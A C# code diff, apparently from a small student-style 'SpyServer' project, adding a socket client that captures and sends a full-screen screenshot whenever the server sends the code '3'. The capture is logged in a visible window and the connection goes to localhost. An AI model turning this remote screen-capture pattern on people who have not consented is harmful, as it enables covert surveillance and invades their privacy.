@@ -6,18 +6,17 @@ using System.Threading.Tasks;
 using System.Net;
 using System.Net.Sockets;
 using System.Threading;
-using System.IO;
 
 namespace SpyServer
 {
     class Client
     {
-        private string name;
-        private static IPAddress serverIP = IPAddress.Parse("127.0.0.1");
+        private readonly string name;
+        private readonly static IPAddress serverIP = IPAddress.Parse("127.0.0.1");
         private const int port = 5000;
 
         private NetworkStream ns;
-        private ClientPanel mainWindow;
+        private readonly ClientPanel mainWindow;
 
         public Client(string name, ClientPanel window)
         {
@@ -55,20 +54,42 @@ namespace SpyServer
 
             while ((byte_count = ns.Read(receivedBytes, 0, receivedBytes.Length)) > 0)
             {
-                WriteInfoAsync("-" + name + " reading:  <<" + Encoding.ASCII.GetString(receivedBytes, 0, byte_count) + ">>");
-                
+                string data = Encoding.ASCII.GetString(receivedBytes, 0, byte_count);
+                WriteInfoAsync("-" + name + " reading:  <<" + data + ">>");
+                switch (data)
+                {
+                    case "2":
+                        WriteInfoAsync("Serwer chce tekst");
+                        SendText("Wysylam tekst");
+                        break;
+                    case "3":
+                        WriteInfoAsync("Serwer chce screenshot");
+                        byte[] image = ClientManager.BitmapSourceToByte(ClientManager.CopyScreen());
+                        SendImage(image);
+                        break;
+                }
+
             }
         }
 
-        public void SendData(string text)
+        public void SendText(string text)
         {
-            string data;
-            if (text == null)
-                data = "";
-            else
-                data = text + name;
+            string data = text;
+
+            byte[] msgCode = { byte.Parse("2") };
             byte[] buffer = Encoding.ASCII.GetBytes(data);
-            ns.Write(buffer, 0, buffer.Length);
+
+            byte[] combined = msgCode.Concat(buffer).ToArray();
+            ns.Write(combined, 0, combined.Length);
+        }
+        public void SendImage(byte[] image)
+        {
+           
+            byte[] msgCode = { byte.Parse("3") };
+            byte[] buffer = image;
+
+            byte[] combined = msgCode.Concat(buffer).ToArray();
+            ns.Write(combined, 0, combined.Length);
         }
 
         private void WriteInfo(string text)
@@ -81,7 +102,8 @@ namespace SpyServer
             {
                 mainWindow.LogTextBox.Text += text + "\n";
             });
-        }   
+        }
+        
     }
 
 
